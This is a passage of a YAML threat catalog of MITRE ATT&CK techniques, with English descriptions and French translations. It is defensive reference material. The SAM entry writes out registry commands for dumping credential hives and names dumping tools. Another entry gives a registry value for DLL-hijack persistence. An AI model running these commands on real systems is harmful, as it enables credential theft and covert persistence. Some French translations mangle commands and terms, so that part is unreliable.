          \ peuvent \xE9galement employer plusieurs techniques pour \xE9chapper \xE0\
          \ la d\xE9tection par le r\xE9seau publicitaire. Par exemple, les adversaires\
          \ peuvent acheminer dynamiquement les clics publicitaires pour envoyer du\
          \ trafic automatis\xE9 de robots d'indexation/application de politiques\
          \ vers des sites innocents tout en validant des cibles potentielles, puis\
          \ en envoyant les victimes r\xE9f\xE9renc\xE9es \xE0 partir de clics publicitaires\
          \ r\xE9els vers des pages malveillantes. Ce vecteur d'infection peut donc\
          \ rester cach\xE9 au r\xE9seau publicitaire ainsi qu'\xE0 tout visiteur\
          \ qui n'atteint pas les sites malveillants avec un identifiant valide en\
          \ cliquant sur la publicit\xE9. (Citation : Masquerads-Guardio) D'autres\
          \ astuces, comme des fautes de frappe intentionnelles pour \xE9viter la\
          \ surveillance de la r\xE9putation de la marque, peuvent \xE9galement \xEA\
          tre utilis\xE9es pour \xE9viter la d\xE9tection automatis\xE9e. (Citation\
          \ : spamhaus-malvertising) https://attack.mitre.org/techniques/T1583/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069
    ref_id: T1069
    name: Permission Groups Discovery
    description: 'Adversaries may attempt to discover group and permission settings.
      This information can help adversaries determine which user accounts and groups
      are available, the membership of users in particular groups, and which users
      and groups have elevated permissions.


      Adversaries may attempt to discover group permission settings in many different
      ways. This data may provide the adversary with information about the compromised
      environment that can be used in follow-on activity and targeting.(Citation:
      CrowdStrike BloodHound April 2018)

      https://attack.mitre.org/techniques/T1069'
    translations:
      fr:
        name: "D\xE9couverte des groupes de permission"
        description: "Les adversaires peuvent tenter de d\xE9couvrir les param\xE8\
          tres de groupe et d'autorisation. Ces informations peuvent aider les adversaires\
          \ \xE0 d\xE9terminer quels comptes et groupes d'utilisateurs sont disponibles,\
          \ l'appartenance des utilisateurs \xE0 certains groupes, et quels utilisateurs\
          \ et groupes ont des permissions accrues.\n\nLes adversaires peuvent tenter\
          \ de d\xE9couvrir les param\xE8tres d'autorisation des groupes de multiples\
          \ mani\xE8res. Ces donn\xE9es peuvent fournir \xE0 l'adversaire des informations\
          \ sur l'environnement compromis qui peuvent \xEAtre utilis\xE9es dans des\
          \ activit\xE9s et des ciblages ult\xE9rieurs. (Citation : CrowdStrike Bloodhound\
          \ avril 2018) https://attack.mitre.org/techniques/T1069"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114
    ref_id: T1114
    name: Email Collection
    description: 'Adversaries may target user email to collect sensitive information.
      Emails may contain sensitive data, including trade secrets or personal information,
      that can prove valuable to adversaries. Emails may also contain details of ongoing
      incident response operations, which may allow adversaries to adjust their techniques
      in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB
      Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward
      email from mail servers or clients.

      https://attack.mitre.org/techniques/T1114'
    translations:
      fr:
        name: Collecte par e-mail
        description: "Les adversaires peuvent cibler les emails des utilisateurs pour\
          \ collecter des informations sensibles. Les courriels peuvent contenir des\
          \ donn\xE9es sensibles, y compris des secrets commerciaux ou des informations\
          \ personnelles, qui peuvent s'av\xE9rer pr\xE9cieuses pour les adversaires.\
          \ Les courriels peuvent \xE9galement contenir des d\xE9tails sur les op\xE9\
          rations de r\xE9ponse aux incidents en cours, ce qui peut permettre aux\
          \ adversaires d'ajuster leurs techniques afin de maintenir la persistance\
          \ ou d'\xE9chapper aux d\xE9fenses. (Citation : TrustedSec OOB Communications)(Citation\
          \ : CISA AA20-352A 2021) Les adversaires peuvent collecter ou transf\xE9\
          rer les e-mails depuis des serveurs de messagerie ou des clients.https\_\
          ://attack.mitre.org/techniques/T1114"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.002
    ref_id: T1003.002
    name: Security Account Manager
    description: "Adversaries may attempt to extract credential material from the\
      \ Security Account Manager (SAM) database either through in-memory techniques\
      \ or through the Windows Registry where the SAM database is stored. The SAM\
      \ is a database file that contains local accounts for the host, typically those\
      \ found with the <code>net user</code> command. Enumerating the SAM database\
      \ requires SYSTEM level access.\n\nA number of tools can be used to retrieve\
      \ the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n\
      * [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\n\
      Alternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg\
      \ save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n\
      Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation:\
      \ GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n\
      * RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n\
      https://attack.mitre.org/techniques/T1003/002"
    translations:
      fr:
        name: "Gestionnaire de compte de s\xE9curit\xE9"
        description: "Les adversaires peuvent tenter d'extraire du mat\xE9riel d'accr\xE9\
          ditation de la base de donn\xE9es du Gestionnaire de Comptes de S\xE9curit\xE9\
          \ (SAM) soit via des techniques en m\xE9moire, soit via le Registre Windows\
          \ o\xF9 la base de donn\xE9es SAM est stock\xE9e. Le SAM est un fichier\
          \ de base de donn\xE9es contenant des comptes locaux pour l'h\xF4te, g\xE9\
          n\xE9ralement ceux trouv\xE9s avec la commande <code>net user</code>. L'\xE9\
          num\xE9ration de la base de donn\xE9es SAM n\xE9cessite un acc\xE8s au niveau\
          \ SYST\xC8ME.\n\nPlusieurs outils peuvent \xEAtre utilis\xE9s pour r\xE9\
          cup\xE9rer le fichier SAM via des techniques en m\xE9moire :\n\n* pwdumpx.exe*\
          \ [gsecdump](https://attack.mitre.org/software/S0008)* [Mimikatz](https://attack.mitre.org/software/S0002)*\
          \ secretsdump.py\n\nSinon, le SAM peut \xEAtre extrait du registre avec\
          \ Reg\_:\n\n* <code>reg sauvegarde HKLM\\sam sam</code>* <code>reg sauvegarde\
          \ HKLM\\system</code>\n\nCreddump7 peut ensuite \xEAtre utilis\xE9 pour\
          \ traiter localement la base de donn\xE9es SAM afin de r\xE9cup\xE9rer les\
          \ hachages. (Citation : GitHub Creddump7)\n\nNotes : \n\n* Le compte RID\
          \ 500 est l'administrateur local int\xE9gr\xE9.* RID 501 est le compte invit\xE9\
          .* Les comptes utilisateurs commencent par un RID de 1 000+.https\_://attack.mitre.org/techniques/T1003/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.002
    ref_id: T1596.002
    name: WHOIS
    description: 'Adversaries may search public WHOIS data for information about victims
      that can be used during targeting. WHOIS data is stored by regional Internet
      registries (RIR) responsible for allocating and assigning Internet resources
      such as domain names. Anyone can query WHOIS servers for information about a
      registered domain, such as assigned IP blocks, contact information, and DNS
      nameservers.(Citation: WHOIS)


      Adversaries may search WHOIS data to gather actionable information. Threat actors
      can use online resources or command-line utilities to pillage through WHOIS
      data for information about potential victims. Information from these sources
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596/002'
    translations:
      fr:
        name: WHOIS
        description: "Les adversaires peuvent consulter les donn\xE9es publiques WHOIS\
          \ pour obtenir des informations sur les victimes pouvant \xEAtre utilis\xE9\
          es lors du ciblage. Les donn\xE9es WHOIS sont stock\xE9es par des registres\
          \ r\xE9gionaux Internet (RIR) responsables de l'allocation et de l'attribution\
          \ des ressources Internet telles que les noms de domaine. Toute personne\
          \ peut interroger les serveurs WHOIS pour obtenir des informations sur un\
          \ domaine enregistr\xE9, telles que les blocs IP attribu\xE9s, les coordonn\xE9\
          es et les serveurs de noms DNS. (Citation : WHOIS)\n\nLes adversaires peuvent\
          \ rechercher les donn\xE9es WHOIS pour recueillir des informations exploitables.\
          \ Les acteurs malveillants peuvent utiliser des ressources en ligne ou des\
          \ utilitaires en ligne de commande pour piler les donn\xE9es WHOIS \xE0\
          \ la recherche d'informations sur les victimes potentielles. Les informations\
          \ provenant de ces sources peuvent r\xE9v\xE9ler d'autres formes de reconnaissance\
          \ (ex : [Scan actif](https://attack.mitre.org/techniques/T1595) ou [Phishing\
          \ pour obtenir des informations](https://attack.mitre.org/techniques/T1598)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition\
          \ d'infrastructure](https://attack.mitre.org/techniques/T1583) ou [Infrastructure\
          \ de compromis](https://attack.mitre.org/techniques/T1584)), et/ou un acc\xE8\
          s initial (ex : [Remote externe Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Relation de confiance](https://attack.mitre.org/techniques/T1199)).https\_\
          ://attack.mitre.org/techniques/T1596/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.001
    ref_id: T1542.001
    name: System Firmware
    description: 'Adversaries may modify system firmware to persist on systems.The
      BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface
      (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware
      that operate as the software interface between the operating system and hardware
      of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation:
      About UEFI)


      System firmware like BIOS and (U)EFI underly the functionality of a computer
      and may be modified by an adversary to perform or assist in malicious activity.
      Capabilities exist to overwrite the system firmware, which may give sophisticated
      adversaries a means to install malicious firmware updates as a means of persistence
      on a system that may be difficult to detect.

      https://attack.mitre.org/techniques/T1542/001'
    translations:
      fr:
        name: "Firmware syst\xE8me"
        description: "Les adversaires peuvent modifier le firmware du syst\xE8me pour\
          \ qu'il persiste sur les syst\xE8mes. Le BIOS (Basic Input/Output System)\
          \ et l'Unified Extensible Firmware Interface (UEFI) ou Extensible Firmware\
          \ Interface (EFI) sont des exemples de micrologiciels syst\xE8me qui fonctionnent\
          \ comme interface logicielle entre le syst\xE8me d'exploitation et le mat\xE9\
          riel d'un ordinateur. (Citation : BIOS Wikip\xE9dia)(Citation : Wikip\xE9\
          dia UEFI)(Citation : \xC0 propos de l'UEFI)\n\nLe firmware syst\xE8me comme\
          \ le BIOS et (U)EFI sous-tend la fonctionnalit\xE9 d'un ordinateur et peut\
          \ \xEAtre modifi\xE9 par un adversaire pour effectuer ou assister dans des\
          \ activit\xE9s malveillantes. Il existe des capacit\xE9s permettant d'\xE9\
          craser le firmware syst\xE8me, ce qui peut permettre aux adversaires sophistiqu\xE9\
          s d'installer des mises \xE0 jour malveillantes du firmware comme moyen\
          \ de persistance sur un syst\xE8me difficile \xE0 d\xE9tecter. https\_://attack.mitre.org/techniques/T1542/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1594
    ref_id: T1594
    name: Search Victim-Owned Websites
    description: 'Adversaries may search websites owned by the victim for information
      that can be used during targeting. Victim-owned websites may contain a variety
      of details, including names of departments/divisions, physical locations, and
      data about key employees such as names, roles, and contact info (ex: [Email
      Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may
      also have details highlighting business operations and relationships.(Citation:
      Comparitech Leak)


      Adversaries may search victim-owned websites to gather actionable information.
      Information from these sources may reveal opportunities for other forms of reconnaissance
      (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or
      [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)
      or [Phishing](https://attack.mitre.org/techniques/T1566)).


      In addition to manually browsing the website, adversaries may attempt to identify
      hidden directories or files that could contain additional sensitive information
      or vulnerable functionality. They may do this through automated activities such
      as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well
      as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap
      XML 2023)(Citation: Register Robots TXT 2015)

      https://attack.mitre.org/techniques/T1594'
    translations:
      fr:
        name: Recherchez des sites web appartenant aux victimes
        description: "Les adversaires peuvent rechercher des informations sur les\
          \ sites appartenant \xE0 la victime lors du ciblage. Les sites web d\xE9\
          tenus par les victimes peuvent contenir une vari\xE9t\xE9 de d\xE9tails,\
          \ notamment les noms des d\xE9partements/divisions, les lieux physiques\
          \ et des donn\xE9es sur les employ\xE9s cl\xE9s tels que les noms, les r\xF4\
          les et les coordonn\xE9es (ex : [Adresses Email](https://attack.mitre.org/techniques/T1589/002)).\
          \ Ces sites peuvent \xE9galement contenir des d\xE9tails mettant en avant\
          \ les op\xE9rations et relations commerciales. (Citation : Fuite Comparitech)\n\
          \nLes adversaires peuvent consulter des sites web d\xE9tenus par les victimes\
          \ pour recueillir des informations exploitables. Les informations provenant\
          \ de ces sources peuvent r\xE9v\xE9ler d'autres formes de reconnaissance\
          \ (ex : [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Rechercher dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ d'\xE9tablir des ressources op\xE9rationnelles (ex : [\xC9tablir des comptes](https://attack.mitre.org/techniques/T1585)\
          \ ou [Compromis des comptes](https://attack.mitre.org/techniques/T1586)),\
          \ et/ou d'un acc\xE8s initial (ex : [Fiable Relation](https://attack.mitre.org/techniques/T1199)\
          \ ou [Phishing](https://attack.mitre.org/techniques/T1566)).\n\nEn plus\
          \ de naviguer manuellement sur le site, les adversaires peuvent tenter d'identifier\
          \ des r\xE9pertoires ou des fichiers cach\xE9s qui pourraient contenir des\
          \ informations sensibles suppl\xE9mentaires ou des fonctionnalit\xE9s vuln\xE9\
          rables. Ils peuvent le faire via des activit\xE9s automatis\xE9es telles\
          \ que [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003),\
          \ ainsi qu'en exploitant des fichiers tels que sitemap.xml et robots.txt.\
          \ (Citation : Perez Sitemap XML 2023)(Citation : Register Robots TXT 2015)https://attack.mitre.org/techniques/T1594"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.003
    ref_id: T1069.003
    name: Cloud Groups
    description: 'Adversaries may attempt to find cloud groups and permission settings.
      The knowledge of cloud permission groups can help adversaries determine the
      particular roles of users and groups within an environment, as well as which
      users are associated with a particular group.


      With authenticated access there are several tools that can be used to find permissions
      groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain
      roles and permissions groups for Exchange and Office 365 accounts (Citation:
      Microsoft Msolrole)(Citation: GitHub Raindance).


      Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces
      to obtain permissions groups. The command <code>az ad user get-member-groups</code>
      will list groups associated to a user account for Azure while the API endpoint
      <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group
      resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation:
      Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API
      Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies`
      allow users to enumerate the policies attached to a role.(Citation: Palo Alto
      Unit 42 Compromised Cloud Compute Credentials 2022)


      Adversaries may attempt to list ACLs for objects to determine the owner and
      other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code>
      API (Citation: AWS Get Bucket ACL). Using this information an adversary can
      target accounts with permissions to a given object or leverage accounts they
      have already compromised to access the object.

      https://attack.mitre.org/techniques/T1069/003'
    translations:
      fr:
        name: Groupes Cloud
        description: "Les adversaires peuvent tenter de trouver des groupes cloud\
          \ et des param\xE8tres d'autorisation. La connaissance des groupes de permissions\
          \ cloud peut aider les adversaires \xE0 d\xE9terminer les r\xF4les particuliers\
          \ des utilisateurs et des groupes au sein d'un environnement, ainsi que\
          \ les utilisateurs associ\xE9s \xE0 un groupe particulier.\n\nAvec l'acc\xE8\
          s authentifi\xE9, plusieurs outils peuvent \xEAtre utilis\xE9s pour trouver\
          \ des groupes de permissions. Le cmdlet PowerShell <code>Get-MsolRole</code>\
          \ peut \xEAtre utilis\xE9 pour obtenir des r\xF4les et des groupes d'autorisations\
          \ pour les comptes Exchange et Office 365 (Citation : Microsoft Msolrole)(Citation\
          \ : GitHub Raindance).\n\nAzure CLI (AZ CLI) et l'API Google Cloud Identity\
          \ Provider fournissent \xE9galement des interfaces pour obtenir des groupes\
          \ d'autorisations. La commande <code>az ad user get-member-groups</code>\
          \ listera les groupes associ\xE9s \xE0 un compte utilisateur pour Azure\
          \ tandis que le point d'acc\xE8s API <code>GET https://cloudidentity.googleapis.com/v1/groups</code>\
          \ liste les ressources de groupe disponibles pour un utilisateur pour Google.\
          \ (Citation : Microsoft AZ CLI)(Citation : Black Hills Red Teaming MS AD\
          \ Azure, 2018)(Citation : Documentation de l'API Google Cloud Identity)\
          \ Dans AWS, les commandes \xAB ListRolePolicies \xBB et \xAB ListAttachedRolePolicies\
          \ \xBB permettent aux utilisateurs d'\xE9num\xE9rer les politiques attach\xE9\
          es \xE0 un r\xF4le. (Citation : Identifiants Cloud Compute compromis de\
          \ Palo Alto Unit 42 2022)\n\nLes adversaires peuvent tenter de lister les\
          \ ACL des objets afin de d\xE9terminer le propri\xE9taire et d'autres comptes\
          \ ayant acc\xE8s \xE0 l'objet, par exemple via l'API AWS <code>GetBucketAcl</code>\
          \ (Citation : AWS Get Bucket ACL). Gr\xE2ce \xE0 ces informations, un adversaire\
          \ peut cibler des comptes ayant des permissions sur un objet donn\xE9 ou\
          \ utiliser des comptes d\xE9j\xE0 compromis pour acc\xE9der \xE0 l'objet.https\_\
          ://attack.mitre.org/techniques/T1069/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.011
    ref_id: T1574.011
    name: Services Registry Permissions Weakness
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ the Registry entries used by services. Flaws in the permissions for Registry\
      \ keys related to services can allow adversaries to redirect the originally\
      \ specified executable to one they control, launching their own code when a\
      \ service starts. Windows stores local service configuration information in\
      \ the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>.\
      \ The information stored under a service's Registry keys can be manipulated\
      \ to modify a service's execution parameters through tools such as the service\
      \ controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
      \ or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys\
      \ is controlled through access control lists and user permissions. (Citation:\
      \ Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions\
      \ for users and groups are not properly set and allow access to the Registry\
      \ keys for a service, adversaries may change the service's binPath/ImagePath\
      \ to point to a different executable under their control. When the service starts\
      \ or is restarted, the adversary-controlled program will execute, allowing the\
      \ adversary to establish persistence and/or privilege escalation to the account\
      \ context the service is set to execute under (local/domain account, SYSTEM,\
      \ LocalService, or NetworkService).\n\nAdversaries may also alter other Registry\
      \ keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code>\
      \ key may be changed so that the service is executed in an elevated context\
      \ anytime the service fails or is intentionally corrupted.(Citation: Kansa Service\
      \ related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code>\
      \ key contains the name of a driver service's performance DLL and the names\
      \ of several exported functions in the DLL.(Citation: microsoft_services_registry_tree)\
      \ If the <code>Performance</code> key is not already present and if an adversary-controlled\
      \ user has the <code>Create Subkey</code> permission, adversaries may create\
      \ the <code>Performance</code> key in the service\u2019s Registry tree to point\
      \ to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also\
      \ add the <code>Parameters</code> key, which can reference malicious drivers\
      \ file paths. This technique has been identified to be a method of abuse by\
      \ configuring DLL file paths within the <code>Parameters</code> key of a given\
      \ services registry configuration. By placing and configuring the <code>Parameters</code>\
      \ key to reference a malicious DLL, adversaries can ensure that their code is\
      \ loaded persistently whenever the associated service or library is invoked.\n\
      \nFor example, the registry path(Citation: MDSec) <code>HKEY_LOCAL_MACHINE\\\
      SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters</code>(Citation: hexacorn)(Citation:\
      \ gendigital) contains the <code>AutodiaDLL</code> value, which specifies the\
      \ DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code>\
      \ to point to a hijacked or malicious DLL:\n\n<code>\"AutodialDLL\"=\"c:\\temp\\\
      foo.dll\"</code>\n\nThis ensures persistence, as it causes the DLL (in this\
      \ case, foo.dll) to be loaded each time the Winsock 2 library is invoked.\n\
      https://attack.mitre.org/techniques/T1574/011"
    translations:
      fr:
        name: Faiblesse des autorisations du registre des services
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les entr\xE9es du Registre utilis\xE9es\
          \ par les services. Des d\xE9fauts dans les autorisations des cl\xE9s du\
          \ registre li\xE9s aux services peuvent permettre aux adversaires de rediriger\
          \ l'ex\xE9cutable initialement sp\xE9cifi\xE9 vers un outil qu'ils contr\xF4\
          lent, lan\xE7ant leur propre code au d\xE9marrage d'un service. Windows\
          \ stocke les informations de configuration locale des services dans le Registre\
          \ sous <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Les informations\
          \ stock\xE9es sous les cl\xE9s du registre d'un service peuvent \xEAtre\
          \ manipul\xE9es pour modifier les param\xE8tres d'ex\xE9cution d'un service\
          \ via des outils tels que le contr\xF4leur de service, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ ou [Reg](https://attack.mitre.org/software/S0075). L'acc\xE8s aux cl\xE9\
          s du registre est contr\xF4l\xE9 via des listes de contr\xF4le d'acc\xE8\
          s et des autorisations utilisateur. (Citation : S\xE9curit\xE9 des cl\xE9\
          s du registre)(Citation : malware_hides_service)\n\nSi les permissions pour\
          \ les utilisateurs et les groupes ne sont pas correctement d\xE9finies et\
          \ permettent l'acc\xE8s aux cl\xE9s du Registre d'un service, les adversaires\
          \ peuvent modifier le binPath/ImagePath du service pour pointer vers un\
          \ autre ex\xE9cutable sous leur contr\xF4le. Lorsque le service d\xE9marre\
          \ ou est red\xE9marr\xE9, le programme contr\xF4l\xE9 par l'adversaire s'ex\xE9\
          cute, permettant \xE0 l'adversaire d'\xE9tablir la persistance et/ou l'escalade\
          \ des privil\xE8ges vers le contexte du compte sous lequel le service est\
          \ configur\xE9 pour s'ex\xE9cuter (compte local/domaine, SYSTEM, LocalService\
          \ ou NetworkService).\n\nLes adversaires peuvent \xE9galement modifier d'autres\
          \ cl\xE9s du Registre dans l'arbre du service. Par exemple, la cl\xE9 <code>FailureCommand</code>\
          \ peut \xEAtre modifi\xE9e afin que le service soit ex\xE9cut\xE9 dans un\
          \ contexte \xE9lev\xE9 \xE0 chaque fois que le service \xE9choue ou est\
          \ intentionnellement corrompu. (Citation : Collecteurs li\xE9s au service\
          \ Kansa)(Citation : Faiblesse des permanentes du registre des tweets)\n\n\
          La cl\xE9 <code>Performance</code> contient le nom de la DLL de performance\
          \ d'un service de pilote ainsi que les noms de plusieurs fonctions export\xE9\
          es dans la DLL. (Citation : microsoft_services_registry_tree) Si la cl\xE9\
          \ <code>Performance</code> n'est pas d\xE9j\xE0 pr\xE9sente et si un utilisateur\
          \ contr\xF4l\xE9 par l'adversaire dispose de la permission <code>Cr\xE9\
          er sous-cl\xE9</code>, les adversaires peuvent cr\xE9er la cl\xE9 <code>Performance</code>\
          \ dans l'arbre du Registre du service pour pointer vers une DLL malveillante.\
          \ (Citation : insecure_reg_perms)\n\nLes adversaires peuvent \xE9galement\
          \ ajouter la cl\xE9 <code>Param\xE8tres</code>, qui peut r\xE9f\xE9rencer\
          \ les chemins de fichiers des pilotes malveillants. Cette technique a \xE9\
          t\xE9 identifi\xE9e comme une m\xE9thode d'abus en configurant les chemins\
          \ de fichiers DLL dans la cl\xE9 <code>Param\xE8tres</code> d'une configuration\
          \ donn\xE9e du registre de services. En pla\xE7ant et configurant la cl\xE9\
          \ <code>Param\xE8tres</code> pour r\xE9f\xE9rencer une DLL malveillante,\
          \ les adversaires peuvent s'assurer que leur code est charg\xE9 de fa\xE7\
          on persistante chaque fois que le service ou la biblioth\xE8que associ\xE9\
          e est invoqu\xE9.\n\nPar exemple, le chemin du registre (Citation : MDSec)\
          \ <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\\
          Parameters</code>(Citation : hexacorn)(Citation : gendigital) contient la\
          \ valeur <code>AutodiaDLL</code>, qui sp\xE9cifie la DLL \xE0 charger pour\
          \ la fonction de composition automatique. Un adversaire pourrait configurer\
          \ le <code>AutodiaDLL</code> pour pointer vers une DLL\_:\n\n<code>\"AutodialDLL\"\
          =\"c\_:\\temp\\foo.dll\"</code> \n\nCela assure la persistance, car cela\
          \ provoque le chargement de la DLL (dans ce cas, foo.dll) \xE0 chaque invocation\
          \ de la biblioth\xE8que Winsock 2.https\_://attack.mitre.org/techniques/T1574/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.001
    ref_id: T1596.001
    name: DNS/Passive DNS
    description: "Adversaries may search DNS data for information about victims that\
      \ can be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries\
      \ may search DNS data to gather actionable information. Threat actors can query\
      \ nameservers for a target organization directly, or search through centralized\
      \ repositories of logged DNS query responses (known as passive DNS).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target\
      \ DNS misconfigurations/leaks that reveal information about internal networks.\
      \ Information from these sources may reveal opportunities for other forms of\
      \ reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
      \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).\nhttps://attack.mitre.org/techniques/T1596/001"
    translations:
      fr:
        name: DNS/DNS passif
        description: "Les adversaires peuvent rechercher dans les donn\xE9es DNS des\
          \ informations sur les victimes pouvant \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations DNS peuvent inclure une vari\xE9t\xE9 de d\xE9tails,\
          \ notamment des serveurs de noms enregistr\xE9s ainsi que des enregistrements\
          \ qui d\xE9taillent l'adressage des sous-domaines, serveurs de messagerie\
          \ et autres h\xF4tes d'une cible.\n\nLes adversaires peuvent rechercher\
          \ les donn\xE9es DNS pour recueillir des informations exploitables. Les\
          \ acteurs malveillants peuvent interroger directement des serveurs de noms\
          \ pour une organisation cible, ou rechercher dans des d\xE9p\xF4ts centralis\xE9\
          s de r\xE9ponses DNS enregistr\xE9es (appel\xE9s DNS passif). (Citation\
          \ : Conteneur DNS)(Citation : DNS passif circulaire) Les adversaires peuvent\
          \ \xE9galement rechercher et cibler des erreurs de configuration/fuites\
          \ DNS qui r\xE9v\xE8lent des informations sur les r\xE9seaux internes. Les\
          \ informations provenant de ces sources peuvent r\xE9v\xE9ler d'autres formes\
          \ de reconnaissance (ex : [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex. : [Acquisition\
          \ d'infrastructure](https://attack.mitre.org/techniques/T1583) ou [Compromission\
          \ d'infrastructure](https://attack.mitre.org/techniques/T1584)), et/ou un\
          \ acc\xE8s initial (ex : [Remote externe Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Relation de confiance](https://attack.mitre.org/techniques/T1199)).https\_\
          ://attack.mitre.org/techniques/T1596/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.003
    ref_id: T1499.003
    name: Application Exhaustion Flood
    description: 'Adversaries may target resource intensive features of applications
      to cause a denial of service (DoS), denying availability to those applications.
      For example, specific features in web applications may be highly resource intensive.
      Repeated requests to those features may be able to exhaust system resources
      and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport
      Jan 2018)

      https://attack.mitre.org/techniques/T1499/003'
    translations:
      fr:
        name: "Inondation d'\xE9puisement de l'application"
        description: "Les adversaires peuvent cibler des fonctionnalit\xE9s gourmandes\
          \ en ressources des applications pour provoquer un d\xE9ni de service (DoS),\
          \ refusant ainsi la disponibilit\xE9 de ces applications. Par exemple, certaines\
          \ fonctionnalit\xE9s dans les applications web peuvent \xEAtre tr\xE8s gourmandes\
          \ en ressources. Des requ\xEAtes r\xE9p\xE9t\xE9es sur ces fonctionnalit\xE9\
          s peuvent \xE9puiser les ressources du syst\xE8me et refuser l'acc\xE8s\
          \ \xE0 l'application ou au serveur lui-m\xEAme. (Citation : Arbor AnnualDoSreport\
          \ janvier 2018)https://attack.mitre.org/techniques/T1499/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.001
    ref_id: T1195.001
    name: Compromise Software Dependencies and Development Tools
    description: 'Adversaries may manipulate software dependencies and development
      tools prior to receipt by a final consumer for the purpose of data or system
      compromise. Applications often depend on external software to function properly.
      Popular open source projects that are used as dependencies in many applications,
      such as pip and NPM packages, may be targeted as a means to add malicious code
      to users of the dependency.(Citation: Trendmicro NPM Compromise)(Citation: Bitdefender
      NPM Repositories Compromised 2021)(Citation: MANDVI Malicious npm and PyPI Packages
      Disguised) This may also include abandoned packages, which in some cases could
      be re-registered by threat actors after being removed by adversaries.(Citation:
      The Hacker News PyPi Revival Hijack 2024) Adversaries may also employ "typosquatting"
      or name-confusion by choosing names similar to existing popular libraries or
      packages in order to deceive a user.(Citation: Ahmed Backdoors in Python and
